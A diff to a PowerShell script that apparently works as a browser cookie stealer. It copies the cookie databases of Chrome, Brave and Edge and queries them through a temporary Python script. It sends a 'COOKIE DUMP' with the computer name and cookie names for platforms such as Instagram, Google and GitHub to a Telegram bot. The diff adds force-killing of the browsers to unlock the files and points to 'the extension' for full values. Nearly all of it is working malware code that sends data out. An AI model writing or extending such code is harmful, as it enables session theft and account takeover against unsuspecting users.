@@ -6,59 +6,35 @@ function Send-TG($text) {
     irm "https://api.telegram.org/bot$BotToken/sendMessage" -Method POST -Body $body -ContentType "application/json" | Out-Null
 }
 
-function Get-CookiesFromDB($path, $browser) {
-    if (!(Test-Path $path)) { return @() }
-    $tmp = "$env:TEMP\cookies_temp.db"
-    Copy-Item $path $tmp -Force
-    
-    $cookies = @()
-    try {
-        Add-Type -Path "C:\Program Files\System.Data.SQLite\bin\System.Data.SQLite.dll" -ErrorAction SilentlyContinue
-        $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$tmp")
-        $conn.Open()
-        $cmd = $conn.CreateCommand()
-        $cmd.CommandText = "SELECT host_key, name, encrypted_value, path, is_secure, is_httponly FROM cookies"
-        $reader = $cmd.ExecuteReader()
-        while ($reader.Read()) {
-            $cookies += @{
-                domain = $reader["host_key"]
-                name = $reader["name"]
-                encrypted = $reader["encrypted_value"]
-                path = $reader["path"]
-                secure = $reader["is_secure"]
-                httpOnly = $reader["is_httponly"]
-                browser = $browser
-            }
-        }
-        $conn.Close()
-    } catch {}
-    Remove-Item $tmp -Force
-    return $cookies
-}
+# Kill all browsers first to unlock the database files
+taskkill /F /IM chrome.exe 2>$null
+taskkill /F /IM brave.exe 2>$null
+taskkill /F /IM msedge.exe 2>$null
+Start-Sleep -Seconds 2
 
-# Try Python3 as fallback (available on most systems)
 function Get-CookiesViaPython($path, $browser) {
     if (!(Test-Path $path)) { return @() }
-    $tmp = "$env:TEMP\cookies_temp.db"
-    Copy-Item $path $tmp -Force
+    $tmp = "$env:TEMP\cookies_temp_$browser.db"
+    Copy-Item $path $tmp -Force 2>$null
+    if (!(Test-Path $tmp)) { return @() }
     
     $pyScript = @"
-import sqlite3, json, sys
+import sqlite3, json
 conn = sqlite3.connect(r"$tmp")
 c = conn.cursor()
-c.execute("SELECT host_key, name, encrypted_value, path, is_secure, is_httponly FROM cookies")
+c.execute("SELECT host_key, name, path, is_secure, is_httponly FROM cookies")
 rows = c.fetchall()
 cookies = []
 for r in rows:
-    cookies.append({"domain":r[0],"name":r[1],"encrypted":r[2].hex(),"path":r[3],"secure":bool(r[4]),"httpOnly":bool(r[5]),"browser":"$browser"})
+    cookies.append({"domain":r[0],"name":r[1],"path":r[2],"secure":bool(r[3]),"httpOnly":bool(r[4]),"browser":"$browser"})
 print(json.dumps(cookies))
 conn.close()
 "@
-    $pyScript | Out-File "$env:TEMP\cookiegrab.py" -Encoding UTF8
-    $result = python3 "$env:TEMP\cookiegrab.py" 2>$null
-    if (!$result) { $result = python "$env:TEMP\cookiegrab.py" 2>$null }
-    Remove-Item "$env:TEMP\cookiegrab.py" -Force
-    Remove-Item $tmp -Force
+    $pyScript | Out-File "$env:TEMP\cookie_grab_$browser.py" -Encoding UTF8
+    $result = python3 "$env:TEMP\cookie_grab_$browser.py" 2>$null
+    if (!$result) { $result = python "$env:TEMP\cookie_grab_$browser.py" 2>$null }
+    Remove-Item "$env:TEMP\cookie_grab_$browser.py" -Force -ErrorAction SilentlyContinue
+    Remove-Item $tmp -Force -ErrorAction SilentlyContinue
     if ($result) { return $result | ConvertFrom-Json }
     return @()
 }
@@ -70,31 +46,33 @@ $browsers = @(
     @{Name="Edge"; Path="$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Network\Cookies"}
 )
 
+Send-TG "🔍 Scanning browser databases..."
+
 foreach ($b in $browsers) {
     $cookies = Get-CookiesViaPython $b.Path $b.Name
     if ($cookies) { $allCookies += $cookies }
 }
 
 if ($allCookies.Count -eq 0) {
-    Send-TG "❌ No cookies found or Python not available."
+    Send-TG "❌ No cookies found."
     exit
 }
 
-# Group and display
-$priority = @('instagram.com','facebook.com','youtube.com','google.com','twitter.com','x.com','reddit.com','github.com','discord.com','tiktok.com')
+$priority = @('instagram.com','facebook.com','youtube.com','google.com','twitter.com','x.com','reddit.com','github.com','discord.com','tiktok.com','linkedin.com','amazon.com','netflix.com','spotify.com')
 $grouped = $allCookies | Group-Object domain
 
-$msg = "📦 <b>COOKIE DUMP</b>`n💻 $env:COMPUTERNAME`n🍪 $($allCookies.Count) cookies`n`n━━━ <b>PLATFORMS</b> ━━━`n"
+$msg = "📦 <b>COOKIE DUMP</b>`n💻 $env:COMPUTERNAME`n🍪 $($allCookies.Count) cookies | $($grouped.Count) domains`n`n━━━ <b>MAJOR PLATFORMS</b> ━━━`n"
 
 foreach ($p in $priority) {
     $found = $grouped | Where-Object { $_.Name -like "*$p*" }
     if ($found) {
-        $msg += "`n🔑 <b>$p</b> ($(($found.Group).Count) cookies)`n"
-        foreach ($c in ($found.Group | Select-Object -First 8)) {
+        $count = ($found.Group).Count
+        $msg += "`n🔑 <b>$p</b> ($count cookies)`n"
+        foreach ($c in ($found.Group | Select-Object -First 5)) {
             $msg += "  • <code>$($c.name)</code> [$($c.browser)]`n"
         }
     }
 }
 
 Send-TG $msg
-Send-TG "✅ Decryption not available from PowerShell. Only cookie names shown."
+Send-TG "✅ Structured dump complete. Use the extension for full values."
